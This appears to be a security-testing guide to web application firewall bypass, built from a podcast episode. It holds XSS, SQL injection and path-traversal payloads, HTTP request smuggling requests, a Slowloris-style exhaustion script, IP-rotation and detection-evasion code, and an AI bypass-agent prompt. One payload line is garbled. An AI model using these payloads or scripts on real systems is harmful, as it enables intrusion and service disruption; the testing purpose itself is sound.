# WAF Bypass Techniques & Strategies

## Purpose
Based on Episode 135 insights with Ryan Barnett - advanced WAF evasion strategies and ethical considerations for security testing.

## Understanding Modern WAFs

### WAF Detection Methods
- **Signature-based**: Pattern matching for known attacks
- **Behavioral analysis**: Anomaly detection in traffic patterns
- **Rate limiting**: IP-based request throttling
- **Reputation scoring**: IP and request reputation analysis
- **Machine learning**: Dynamic pattern recognition

### Common WAF Vendors
- **Akamai**: Enterprise-grade, hardest to bypass
- **Cloudflare**: Popular, good balance of security/performance
- **Imperva**: Strong behavioral analysis
- **AWS WAF**: Configurable rules engine
- **F5**: Traditional enterprise solution

## Encoding & Obfuscation Techniques

### Basic Encoding Bypasses
```javascript
// URL encoding variations
%2e -> .
%2E -> .
%252e -> %2e (double encoding)

// Unicode encoding
\u002e -> .
\uFF0E -> fullwidth period

// Mixed case
<script> -> <ScRiPt>
```

### Advanced Encoding Strategies
```javascript
// UTF-8 overlong encoding
%c0%2e -> .
%c0%af -> /

// Unicode confusables (homoglyphs)
а -> Cyrillic a (not Latin a)
е -> Cyrillic e
о -> Cyrillic o

// Combined techniques
<script>alert(1)</script>
<%73%63%72%69%70%74>alert(1)</%73%63%72%69%70%74>
```

## Multi-Technique Combination Strategies

### The "Mix and Match" Approach
Based on Ryan Barnett's insight: combining multiple techniques is more effective than single methods.

### Example Combinations
```javascript
// 1. Encoding + Case Variation + Comments
<ScRiPt/**/><!--*/alert(1)<!--*/</ScRiPt>

// 2. Unicode + Encoding + Obfuscation
<ｓｃｒｉｐ�74%65>alert(1)</ｓｃｒ%69%70%74>

// 3. Protocol Manipulation + Encoding
GET /?x=<script>alert(1)</script> HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
```

### Advanced Bypass Patterns
```javascript
// 1. Parameter Pollution
?id=1&id=<script>alert(1)</script>

// 2. Array Syntax Abuse
param[]=value&param[]=<script>alert(1)</script>

// 3. JSON Injection
{"param":"<script>alert(1)</script>"}

// 4. Comment Obfuscation
<!--<script>alert(1)</script>-->
<!--<script>alert(1)</script>--!>
```

## Protocol-Level Bypasses

### HTTP Header Manipulation
```http
# Method confusion
POST /endpoint?id=<script>alert(1)</script> HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
X-HTTP-Method-Override: GET

# Header injection
GET / HTTP/1.1
Host: target.com
X-Forwarded-For: <script>alert(1)</script>
Referer: <script>alert(1)</script>
```

### Request Splitting
```http
# HTTP Request Smuggling
POST / HTTP/1.1
Host: target.com
Content-Length: 50
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: target.com
```

## IP Rotation & Infrastructure

### Ethical IP Distribution Methods
```bash
# Using legitimate cloud infrastructure
# Note: Check ToS for each provider

# AWS (check ToS compliance)
aws ec2 run-instances --image-id ami-12345 --count 5

# DigitalOcean (research-friendly)
doctl compute droplet create --image ubuntu-20-04-x64

# Vultr (hacker-friendly)
vultr-cli instance create --os 387
```

### Infrastructure Automation
```python
# Automated IP rotation script
import requests
import time

def rotate_ips_and_test(target_url, payloads):
    ips = get_available_ips()  # Your IP pool
    
    for ip in ips:
        for payload in payloads:
            response = send_request(target_url, payload, ip)
            if is_bypass_successful(response):
                log_successful_bypass(ip, payload)
        
        time.sleep(1)  # Rate limiting
```

## AI-Assisted WAF Bypassing

### Shift Agents for WAF Testing
Based on Episode 138 - Create custom micro-agents for systematic WAF bypass testing.

```javascript
// WAF Bypass Agent System Prompt
You are a WAF bypass specialist. Test the following techniques systematically:
1. Encoding variations (URL, Unicode, double)
2. Case variations and mixed encoding
3. Comment obfuscation
4. Protocol manipulation
5. Parameter pollution
6. Header manipulation

For each technique:
- Apply to the target payload
- Analyze WAF response
- Note bypass success/failure
- Document effective patterns
```

### Automated Payload Generation
```python
# AI-powered payload generator
def generate_waf_bypass_payloads(base_payload):
    variations = []
    
    # Encoding variations
    variations.append(encode_url(base_payload))
    variations.append(encode_unicode(base_payload))
    variations.append(encode_double(base_payload))
    
    # Case variations
    variations.append(randomize_case(base_payload))
    
    # Comment insertion
    variations.append(insert_comments(base_payload))
    
    # Protocol variations
    variations.append(apply_protocol_tricks(base_payload))
    
    return variations
```

## Ethical Considerations

### Acceptable Use Policy Compliance
- **Read ToS carefully**: Each provider has different policies
- **Legitimate research**: Only for authorized testing
- **Rate limiting**: Don't abuse infrastructure
- **Documentation**: Keep records of authorization

### Professional Guidelines
```bash
# Before testing:
1. Verify authorization scope
2. Check provider ToS compliance
3. Set up proper monitoring
4. Prepare responsible disclosure plan

# During testing:
1. Stay within authorized boundaries
2. Monitor impact on target systems
3. Document all findings
4. Stop if unexpected issues arise

# After testing:
1. Clean up all test infrastructure
2. Submit responsible disclosure
3. Follow up on vulnerability status
4. Contribute to security community
```

## Advanced Techniques

### Unicode Confusables Deep Dive
```javascript
// Homoglyph attack vectors
const confusables = {
    'a': 'а', // Cyrillic
    'e': 'е', // Cyrillic  
    'o': 'о', // Cyrillic
    'p': 'р', // Cyrillic
    'c': 'с', // Cyrillic
    'i': 'і', // Ukrainian
    'j': 'ј', // Cyrillic
    'v': 'ѵ' // Cyrillic
};

// Apply to payload
function applyConfusables(payload) {
    return payload.replace(/[aeopcijv]/g, char => confusables[char] || char);
}
```

### Timing-Based Bypasses
```python
# Slowloris-style attacks for WAF exhaustion
def slowloris_waf_bypass(target):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, 80))
    
    # Send incomplete headers slowly
    s.send(b"GET / HTTP/1.1\r\n")
    s.send(b"Host: target.com\r\n")
    s.send(b"User-Agent: ")
    
    # Keep connection open with partial data
    while True:
        s.send(b"a" * 16)
        time.sleep(5)
```

## Detection and Evasion

### WAF Detection Techniques
```python
# Identify WAF presence
def detect_waf(target_url):
    waf_signatures = {
        'Akamai': ['akamai', 'akamaighost'],
        'Cloudflare': ['cloudflare', '__cfduid'],
        'Imperva': ['imperva', 'incapsula'],
        'AWS': ['x-amz-cf-id']
    }
    
    response = requests.get(target_url)
    headers = response.headers.lower()
    
    for waf, signatures in waf_signatures.items():
        if any(sig in headers for sig in signatures):
            return waf
    
    return "Unknown"
```

### Evasion of Detection
```python
# Randomize request patterns
def randomize_request_pattern():
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
        'Mozilla/5.0 (X11; Linux x86_64)'
    ]
    
    headers = {
        'User-Agent': random.choice(user_agents),
        'Accept': random.choice(['*/*', 'text/html', 'application/json']),
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'en;q=0.8']),
        'Connection': random.choice(['keep-alive', 'close'])
    }
    
    return headers
```

## Testing Methodology

### Systematic WAF Testing Framework
```python
class WAFBypassTester:
    def __init__(self, target_url, authorization):
        self.target = target_url
        self.auth = authorization
        self.results = []
    
    def test_bypass_techniques(self, payload):
        techniques = [
            self.test_encoding_variations,
            self.test_unicode_confusables,
            self.test_protocol_manipulation,
            self.test_parameter_pollution,
            self.test_header_manipulation
        ]
        
        for technique in techniques:
            result = technique(payload)
            self.results.append(result)
    
    def generate_report(self):
        successful_bypasses = [r for r in self.results if r.success]
        return {
            'target': self.target,
            'total_tests': len(self.results),
            'successful_bypasses': len(successful_bypasses),
            'bypass_rate': len(successful_bypasses) / len(self.results),
            'techniques': successful_bypasses
        }
```

## Quick Reference Commands

### Essential Payloads
```bash
# Basic XSS with encoding
<script>alert(1)</script>
%3Cscript%3Ealert(1)%3C/script%3E
<ScRiPt>alert(1)</ScRiPt>

# SQL injection variations
' OR 1=1--
' OR '1'='1
' UNION SELECT NULL--

# File inclusion tricks
../../../../etc/passwd
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

### Testing Commands
```bash
# Test WAF detection
curl -I https://target.com

# Test basic bypass
curl -X POST "https://target.com/search" \
  -d "query=<script>alert(1)</script>"

# Test with headers
curl -X GET "https://target.com/api" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "User-Agent: <script>alert(1)</script>"
```

## Community Resources

### Tools and Frameworks
- **Shift Agents**: Custom micro-agents for automated testing
- **Burp Suite Extensions**: WAF testing plugins
- **OWASP ZAP**: Open-source WAF testing
- **Custom Scripts**: Python/NodeJS automation

### Learning Resources
- **PortSwigger Web Security Academy**: Free WAF bypass training
- **OWASP Testing Guide**: Comprehensive testing methodology
- **CTBBP Discord**: Community techniques and discussions
- **Bug Bounty Reports**: Real-world bypass examples

---

*Based on Episode 135 (Akamai's Ryan Barnett on WAFs) with ethical considerations and advanced bypass strategies*
